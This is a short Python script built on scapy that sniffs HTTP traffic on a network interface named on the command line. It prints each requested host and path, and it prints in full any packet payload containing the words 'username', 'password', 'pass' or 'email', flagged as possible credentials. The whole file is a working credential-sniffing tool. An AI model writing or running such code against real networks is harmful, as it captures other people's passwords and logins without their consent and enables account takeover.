import scapy.all as scapy
import argparse
from scapy.layers import http
import colorama
from colorama import Fore

def getInterface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface", dest = "interface", help="specify where the interface is")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    #accumulator = false (do not buffer sniffed packets)
    scapy.sniff(iface=iface, store = False, prn = processPacket)

def processPacket(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP request >>"+(packet[http.HTTPRequest].Host).decode('utf-8')+(packet[http.HTTPRequest].Path).decode('utf-8'))
        #checks the packet for a raw layer of password and username
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = (["username".encode('utf-8'), "password".encode('utf-8'), "pass".encode('utf-8'), "email".encode('utf-8')])
            for key in keys:
                if key in load:
                    print(Fore.GREEN+ "\n\n\n[+] Possible username/password >> "+ load.decode('utf-8') + "\n\n\n")
                    break
iface = getInterface()
sniff(iface)

